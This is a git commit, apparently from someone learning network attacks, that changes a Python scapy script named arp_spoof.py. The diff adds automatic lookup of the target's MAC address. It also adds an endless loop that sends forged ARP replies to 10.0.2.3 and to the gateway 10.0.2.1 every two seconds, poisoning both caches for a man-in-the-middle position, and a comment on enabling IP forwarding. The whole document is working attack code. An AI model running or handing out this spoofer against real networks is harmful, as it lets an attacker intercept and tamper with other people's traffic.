5c0b3a4a9eb63020524ecf4132d93468abaec823
Rosenmatt1 <rosenmatt1@gmail.com>
2021-01-27 22:53:37 -0500

    Ran the spoof function twice in a while loop that runs every two seconds

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import scapy.all as scapy
+import time
 
 scapy.ls(scapy.ARP) #in terminal
 #pdst is the ip of the target computer
@@ -8,7 +9,7 @@ scapy.ls(scapy.ARP) #in terminal
 #op 2 is response, instead of request
 
 
-def scan(ip):
+def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
@@ -16,9 +17,18 @@ def scan(ip):
     # answered_list, unanswsered_list = scapy.srp(arp_request_broadcast, timeout=1)
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #tells it to return only 1st item returned which is the answered list
     # print(answered_list.summary())
+    return answered_list[0][1].hwsrc
 
 
 def spoof(target_ip, spoof_ip):
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:4d:08:65", psrc=spoof_ip)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
-    "10.0.2.1 "
+
+
+while True:
+    spoof("10.0.2.3", "10.0.2.1")
+    spoof("10.0.2.1", "10.0.2.3")
+    time.sleep(2)
+
+# terminal will require > echo 1 > /proc/sys/net/ipv4/ip_forward
